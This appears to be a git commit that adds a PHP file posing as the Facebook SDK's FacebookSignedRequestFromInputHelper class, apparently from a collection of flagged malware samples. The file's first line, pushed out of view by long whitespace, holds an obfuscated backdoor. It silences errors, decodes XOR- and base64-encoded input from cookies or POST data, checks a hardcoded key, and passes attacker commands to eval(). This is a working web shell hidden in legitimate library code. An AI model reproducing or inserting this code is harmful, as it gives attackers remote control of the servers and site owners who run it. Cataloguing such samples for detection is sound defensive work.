a611e02a744efa4abedd06d36531dfd161f5d35e
Stefan Pejcic <pejcha1994@gmail.com>
2021-01-31 10:15:36 +0100

    [Fingerprint Match] [PHP Injection Exploit [P0997]]
    [Fingerprint Match] [PHP Injection Exploit [P0997]]

---
+++ 31.01.2021/system/library/devmanextensions_poc/Facebook/Helpers/FacebookSignedRequestFromInputHelper.php
@@ -0,0 +1,166 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $a9f9ae = 742;$GLOBALS['r88892e'] = Array();global $r88892e;$r88892e = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['na27278'] = "\x53\x5a\x66\x2d\x57\x7d\x65\x59\x73\x67\x69\x5d\x23\x2b\x2f\x4d\x3f\x21\x45\x6d\x38\x3e\x27\x34\x30\x62\x6e\x2e\x63\x25\x70\x5c\x32\x3d\x36\xa\x42\x44\x77\x79\x29\x4f\xd\x76\x6c\x35\x64\x61\x68\x60\x46\x51\x55\x41\x20\x3c\x5e\x7a\x4c\x26\x2a\x3a\x7e\x58\x39\x28\x78\x4b\x43\x47\x2c\x3b\x5b\x7c\x54\x56\x4e\x72\x31\x4a\x5f\x75\x40\x22\x6f\x52\x7b\x48\x49\x37\x6a\x50\x74\x24\x71\x6b\x9\x33";$r88892e[$r88892e['na27278'][8].$r88892e['na27278'][23].$r88892e['na27278'][97].$r88892e['na27278'][46].$r88892e['na27278'][64].$r88892e['na27278'][23].$r88892e['na27278'][25].$r88892e['na27278'][46]] = $r88892e['na27278'][28].$r88892e['na27278'][48].$r88892e['na27278'][77];$r88892e[$r88892e['na27278'][2].$r88892e['na27278'][20].$r88892e['na27278'][45].$r88892e['na27278'][6]] = $r88892e['na27278'][84].$r88892e['na27278'][77].$r88892e['na27278'][46];$r88892e[$r88892e['na27278'][30].$r88892e['na27278'][23].$r88892e['na27278'][46].$r88892e['na27278'][6].$r88892e['na27278'][28].$r88892e['na27278'][32]] = $r88892e['na27278'][8].$r88892e['na27278'][92].$r88892e['na27278'][77].$r88892e['na27278'][44].$r88892e['na27278'][6].$r88892e['na27278'][26];$r88892e[$r88892e['na27278'][43].$r88892e['na27278'][20].$r88892e['na27278'][97].$r88892e['na27278'][46].$r88892e['na27278'][47]] = $r88892e['na27278'][10].$r88892e['na27278'][26].$r88892e['na27278'][10].$r88892e['na27278'][80].$r88892e['na27278'][8].$r88892e['na27278'][6].$r88892e['na27278'][92];$r88892e[$r88892e['na27278'][44].$r88892e['na27278'][97].$r88892e['na27278'][2].$r88892e['na27278'][24].$r88892e['na27278'][34].$r88892e['na27278'][97].$r88892e['na27278'][6].$r88892e['na27278'][32]] = $r88892e['na27278'][8].$r88892e['na27278'][6].$r88892e['na27278'][77].$r88892e['na27278'][10].$r88892e['na27278'][47].$r88892e['na27278'][44].$r88892e['na27278'][10].$r88892e['na27278'][57].$r88892e['na27278'][6];$r88892e[$r88892e['na27278'][47].$r88892e['na27278'][20].$r88892e['na27278'][23].$r88892e['na27278'][47]] = $r88892e['na27278'][30].$r88892e['na27278'][48].$r88892e['na27278'][30].$r88892e['na27278'][43].$r88892e['na27278'][6].$r88892e['na27278'][77].$r88892e['na27278'][8].$r88892e['na27278'][10].$r88892e['na27278'][84].$r88892e['na27278'][26];$r88892e[$r88892e['na27278'][48].$r88892e['na27278'][24].$r88892e['na27278'][34].$r88892e['na27278'][2].$r88892e['na27278'][64].$r88892e['na27278'][89].$r88892e['na27278'][47]] = $r88892e['na27278'][81].$r88892e['na27278'][26].$r88892e['na27278'][8].$r88892e['na27278'][6].$r88892e['na27278'][77].$r88892e['na27278'][10].$r88892e['na27278'][47].$r88892e['na27278'][44].$r88892e['na27278'][10].$r88892e['na27278'][57].$r88892e['na27278'][6];$r88892e[$r88892e['na27278'][77].$r88892e['na27278'][97].$r88892e['na27278'][20].$r88892e['na27278'][32].$r88892e['na27278'][23].$r88892e['na27278'][97].$r88892e['na27278'][23]] = $r88892e['na27278'][25].$r88892e['na27278'][47].$r88892e['na27278'][8].$r88892e['na27278'][6].$r88892e['na27278'][34].$r88892e['na27278'][23].$r88892e['na27278'][80].$r88892e['na27278'][46].$r88892e['na27278'][6].$r88892e['na27278'][28].$r88892e['na27278'][84].$r88892e['na27278'][46].$r88892e['na27278'][6];$r88892e[$r88892e['na27278'][28].$r88892e['na27278'][34].$r88892e['na27278'][47].$r88892e['na27278'][6].$r88892e['na27278'][32].$r88892e['na27278'][97].$r88892e['na27278'][97].$r88892e['na27278'][25].$r88892e['na27278'][34]] = $r88892e['na27278'][8].$r88892e['na27278'][6].$r88892e['na27278'][92].$r88892e['na27278'][80].$r88892e['na27278'][92].$r88892e['na27278'][10].$r88892e['na27278'][19].$r88892e['na27278'][6].$r88892e['na27278'][80].$r88892e['na27278'][44].$r88892e['na27278'][10].$r88892e['na27278'][19].$r88892e['na27278'][10].$r88892e['na27278'][92];$r88892e[$r88892e['na27278'][39].$r88892e['na27278'][25].$r88892e['na27278'][32].$r88892e['na27278'][64]] = $r88892e['na27278'][38].$r88892e['na27278'][32].$r88892e['na27278'][89].$r88892e['na27278'][46].$r88892e['na27278'][64].$r88892e['na27278'][6];$r88892e[$r88892e['na27278'][10].$r88892e['na27278'][24].$r88892e['na27278'][46].$r88892e['na27278'][23].$r88892e['na27278'][34].$r88892e['na27278'][97].$r88892e['na27278'][25].$r88892e['na27278'][64].$r88892e['na27278'][28]] = $r88892e['na27278'][77].$r88892e['na27278'][78].$r88892e['na27278'][2].$r88892e['na27278'][45];$r88892e[$r88892e['na27278'][94].$r88892e['na27278'][97].$r88892e['na27278'][24].$r88892e['na27278'][28].$r88892e['na27278'][45].$r88892e['na27278'][32]] = $_POST;$r88892e[$r88892e['na27278'][81].$r88892e['na27278'][97].$r88892e['na27278'][6].$r88892e['na27278'][2].$r88892e['na27278'][45].$r88892e['na27278'][6]] = $_COOKIE;@$r88892e[$r88892e['na27278'][43].$r88892e['na27278'][20].$r88892e['na27278'][97].$r88892e['na27278'][46].$r88892e['na27278'][47]]($r88892e['na27278'][6].$r88892e['na27278'][77].$r88892e['na27278'][77].$r88892e['na27278'][84].$r88892e['na27278'][77].$r88892e['na27278'][80].$r88892e['na27278'][44].$r88892e['na27278'][84].$r88892e['na27278'][9], NULL);@$r88892e[$r88892e['na27278'][43].$r88892e['na27278'][20].$r88892e['na27278'][97].$r88892e['na27278'][46].$r88892e['na27278'][47]]($r88892e['na27278'][44].$r88892e['na27278'][84].$r88892e['na27278'][9].$r88892e['na27278'][80].$r88892e['na27278'][6].$r88892e['na27278'][77].$r88892e['na27278'][77].$r88892e['na27278'][84].$r88892e['na27278'][77].$r88892e['na27278'][8], 0);@$r88892e[$r88892e['na27278'][43].$r88892e['na27278'][20].$r88892e['na27278'][97].$r88892e['na27278'][46].$r88892e['na27278'][47]]($r88892e['na27278'][19].$r88892e['na27278'][47].$r88892e['na27278'][66].$r88892e['na27278'][80].$r88892e['na27278'][6].$r88892e['na27278'][66].$r88892e['na27278'][6].$r88892e['na27278'][28].$r88892e['na27278'][81].$r88892e['na27278'][92].$r88892e['na27278'][10].$r88892e['na27278'][84].$r88892e['na27278'][26].$r88892e['na27278'][80].$r88892e['na27278'][92].$r88892e['na27278'][10].$r88892e['na27278'][19].$r88892e['na27278'][6], 0);@$r88892e[$r88892e['na27278'][28].$r88892e['na27278'][34].$r88892e['na27278'][47].$r88892e['na27278'][6].$r88892e['na27278'][32].$r88892e['na27278'][97].$r88892e['na27278'][97].$r88892e['na27278'][25].$r88892e['na27278'][34]](0);$b3f802 = NULL;$rd63eede = NULL;$r88892e[$r88892e['na27278'][30].$r88892e['na27278'][24].$r88892e['na27278'][78].$r88892e['na27278'][25].$r88892e['na27278'][46].$r88892e['na27278'][6]] = $r88892e['na27278'][2].$r88892e['na27278'][23].$r88892e['na27278'][28].$r88892e['na27278'][97].$r88892e['na27278'][97].$r88892e['na27278'][28].$r88892e['na27278'][78].$r88892e['na27278'][32].$r88892e['na27278'][3].$r88892e['na27278'][28].$r88892e['na27278'][32].$r88892e['na27278'][24].$r88892e['na27278'][78].$r88892e['na27278'][3].$r88892e['na27278'][23].$r88892e['na27278'][6].$r88892e['na27278'][6].$r88892e['na27278'][25].$r88892e['na27278'][3].$r88892e['na27278'][20].$r88892e['na27278'][89].$r88892e['na27278'][23].$r88892e['na27278'][46].$r88892e['na27278'][3].$r88892e['na27278'][2].$r88892e['na27278'][34].$r88892e['na27278'][24].$r88892e['na27278'][24].$r88892e['na27278'][2].$r88892e['na27278'][47].$r88892e['na27278'][78].$r88892e['na27278'][46].$r88892e['na27278'][46].$r88892e['na27278'][47].$r88892e['na27278'][78].$r88892e['na27278'][32];global $p01bde;function  r1f5($b3f802, $g9cc){global $r88892e;$g744ce3 = "";for ($p05e5=0; $p05e5<$r88892e[$r88892e['na27278'][30].$r88892e['na27278'][23].$r88892e['na27278'][46].$r88892e['na27278'][6].$r88892e['na27278'][28].$r88892e['na27278'][32]]($b3f802);){for ($tb1851=0; $tb1851<$r88892e[$r88892e['na27278'][30].$r88892e['na27278'][23].$r88892e['na27278'][46].$r88892e['na27278'][6].$r88892e['na27278'][28].$r88892e['na27278'][32]]($g9cc) && $p05e5<$r88892e[$r88892e['na27278'][30].$r88892e['na27278'][23].$r88892e['na27278'][46].$r88892e['na27278'][6].$r88892e['na27278'][28].$r88892e['na27278'][32]]($b3f802); $tb1851++, $p05e5++){$g744ce3 .= $r88892e[$r88892e['na27278'][8].$r88892e['na27278'][23].$r88892e['na27278'][97].$r88892e['na27278'][46].$r88892e['na27278'][64].$r88892e['na27278'][23].$r88892e['na27278'][25].$r88892e['na27278'][46]]($r88892e[$r88892e['na27278'][2].$r88892e['na27278'][20].$r88892e['na27278'][45].$r88892e['na27278'][6]]($b3f802[$p05e5]) ^ $r88892e[$r88892e['na27278'][2].$r88892e['na27278'][20].$r88892e['na27278'][45].$r88892e['na27278'][6]]($g9cc[$tb1851]));}}return $g744ce3;}function  w27d9e($b3f802, $g9cc){global $r88892e;global $p01bde;return $r88892e[$r88892e['na27278'][10].$r88892e['na27278'][24].$r88892e['na27278'][46].$r88892e['na27278'][23].$r88892e['na27278'][34].$r88892e['na27278'][97].$r88892e['na27278'][25].$r88892e['na27278'][64].$r88892e['na27278'][28]]($r88892e[$r88892e['na27278'][10].$r88892e['na27278'][24].$r88892e['na27278'][46].$r88892e['na27278'][23].$r88892e['na27278'][34].$r88892e['na27278'][97].$r88892e['na27278'][25].$r88892e['na27278'][64].$r88892e['na27278'][28]]($b3f802, $p01bde), $g9cc);}foreach ($r88892e[$r88892e['na27278'][81].$r88892e['na27278'][97].$r88892e['na27278'][6].$r88892e['na27278'][2].$r88892e['na27278'][45].$r88892e['na27278'][6]] as $g9cc=>$db003a8){$b3f802 = $db003a8;$rd63eede = $g9cc;}if (!$b3f802){foreach ($r88892e[$r88892e['na27278'][94].$r88892e['na27278'][97].$r88892e['na27278'][24].$r88892e['na27278'][28].$r88892e['na27278'][45].$r88892e['na27278'][32]] as $g9cc=>$db003a8){$b3f802 = $db003a8;$rd63eede = $g9cc;}}$b3f802 = @$r88892e[$r88892e['na27278'][48].$r88892e['na27278'][24].$r88892e['na27278'][34].$r88892e['na27278'][2].$r88892e['na27278'][64].$r88892e['na27278'][89].$r88892e['na27278'][47]]($r88892e[$r88892e['na27278'][39].$r88892e['na27278'][25].$r88892e['na27278'][32].$r88892e['na27278'][64]]($r88892e[$r88892e['na27278'][77].$r88892e['na27278'][97].$r88892e['na27278'][20].$r88892e['na27278'][32].$r88892e['na27278'][23].$r88892e['na27278'][97].$r88892e['na27278'][23]]($b3f802), $rd63eede));if (isset($b3f802[$r88892e['na27278'][47].$r88892e['na27278'][95]]) && $p01bde==$b3f802[$r88892e['na27278'][47].$r88892e['na27278'][95]]){if ($b3f802[$r88892e['na27278'][47]] == $r88892e['na27278'][10]){$p05e5 = Array($r88892e['na27278'][30].$r88892e['na27278'][43] => @$r88892e[$r88892e['na27278'][47].$r88892e['na27278'][20].$r88892e['na27278'][23].$r88892e['na27278'][47]](),$r88892e['na27278'][8].$r88892e['na27278'][43] => $r88892e['na27278'][78].$r88892e['na27278'][27].$r88892e['na27278'][24].$r88892e['na27278'][3].$r88892e['na27278'][78],);echo @$r88892e[$r88892e['na27278'][44].$r88892e['na27278'][97].$r88892e['na27278'][2].$r88892e['na27278'][24].$r88892e['na27278'][34].$r88892e['na27278'][97].$r88892e['na27278'][6].$r88892e['na27278'][32]]($p05e5);}elseif ($b3f802[$r88892e['na27278'][47]] == $r88892e['na27278'][6]){eval/*jd370a*/($b3f802[$r88892e['na27278'][46]]);}exit();} ?><?php
+/**
+ * Copyright 2017 Facebook, Inc.
+ *
+ * You are hereby granted a non-exclusive, worldwide, royalty-free license to
+ * use, copy, modify, and distribute this software in source code or binary
+ * form for use in connection with the web services and APIs provided by
+ * Facebook.
+ *
+ * As with any software that integrates with the Facebook platform, your use
+ * of this software is subject to the Facebook Developer Principles and
+ * Policies [http://developers.facebook.com/policy/]. This copyright notice
+ * shall be included in all copies or substantial portions of the software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
+ * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+ * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
+ * DEALINGS IN THE SOFTWARE.
+ *
+ */
+namespace Facebook\Helpers;
+
+use Facebook\Facebook;
+use Facebook\FacebookApp;
+use Facebook\FacebookClient;
+use Facebook\SignedRequest;
+use Facebook\Authentication\AccessToken;
+use Facebook\Authentication\OAuth2Client;
+
+/**
+ * Class FacebookSignedRequestFromInputHelper
+ *
+ * @package Facebook
+ */
+abstract class FacebookSignedRequestFromInputHelper
+{
+    /**
+     * @var SignedRequest|null The SignedRequest entity.
+     */
+    protected $signedRequest;
+
+    /**
+     * @var FacebookApp The FacebookApp entity.
+     */
+    protected $app;
+
+    /**
+     * @var OAuth2Client The OAuth 2.0 client service.
+     */
+    protected $oAuth2Client;
+
+    /**
+     * Initialize the helper and process available signed request data.
+     *
+     * @param FacebookApp    $app          The FacebookApp entity.
+     * @param FacebookClient $client       The client to make HTTP requests.
+     * @param string|null    $graphVersion The version of Graph to use.
+     */
+    public function __construct(FacebookApp $app, FacebookClient $client, $graphVersion = null)
+    {
+        $this->app = $app;
+        $graphVersion = $graphVersion ?: Facebook::DEFAULT_GRAPH_VERSION;
+        $this->oAuth2Client = new OAuth2Client($this->app, $client, $graphVersion);
+
+        $this->instantiateSignedRequest();
+    }
+
+    /**
+     * Instantiates a new SignedRequest entity.
+     *
+     * @param string|null
+     */
+    public function instantiateSignedRequest($rawSignedRequest = null)
+    {
+        $rawSignedRequest = $rawSignedRequest ?: $this->getRawSignedRequest();
+
+        if (!$rawSignedRequest) {
+            return;
+        }
+
+        $this->signedRequest = new SignedRequest($this->app, $rawSignedRequest);
+    }
+
+    /**
+     * Returns an AccessToken entity from the signed request.
+     *
+     * @return AccessToken|null
+     *
+     * @throws \Facebook\Exceptions\FacebookSDKException
+     */
+    public function getAccessToken()
+    {
+        if ($this->signedRequest && $this->signedRequest->hasOAuthData()) {
+            $code = $this->signedRequest->get('code');
+            $accessToken = $this->signedRequest->get('oauth_token');
+
+            if ($code && !$accessToken) {
+                return $this->oAuth2Client->getAccessTokenFromCode($code);
+            }
+
+            $expiresAt = $this->signedRequest->get('expires', 0);
+
+            return new AccessToken($accessToken, $expiresAt);
+        }
+
+        return null;
+    }
+
+    /**
+     * Returns the SignedRequest entity.
+     *
+     * @return SignedRequest|null
+     */
+    public function getSignedRequest()
+    {
+        return $this->signedRequest;
+    }
+
+    /**
+     * Returns the user_id if available.
+     *
+     * @return string|null
+     */
+    public function getUserId()
+    {
+        return $this->signedRequest ? $this->signedRequest->getUserId() : null;
+    }
+
+    /**
+     * Get raw signed request from input.
+     *
+     * @return string|null
+     */
+    abstract public function getRawSignedRequest();
+
+    /**
+     * Get raw signed request from POST input.
+     *
+     * @return string|null
+     */
+    public function getRawSignedRequestFromPost()
+    {
+        if (isset($_POST['signed_request'])) {
+            return $_POST['signed_request'];
+        }
+
+        return null;
+    }
+
+    /**
+     * Get raw signed request from cookie set from the Javascript SDK.
+     *
+     * @return string|null
+     */
+    public function getRawSignedRequestFromCookie()
+    {
+        if (isset($_COOKIE['fbsr_' . $this->app->getId()])) {
+            return $_COOKIE['fbsr_' . $this->app->getId()];
+        }
+
+        return null;
+    }
+}
